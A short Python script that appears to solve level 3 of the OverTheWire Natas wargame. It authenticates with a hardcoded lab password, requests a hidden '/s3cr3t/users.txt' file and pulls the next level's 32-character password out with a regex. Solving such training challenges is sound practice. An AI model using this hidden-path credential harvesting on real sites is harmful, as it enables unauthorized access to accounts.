import re
import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth('natas3', 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14')
def get_pass():
    r = requests.get('http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt', auth=auth)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[0])
if __name__ == "__main__":
    get_pass()
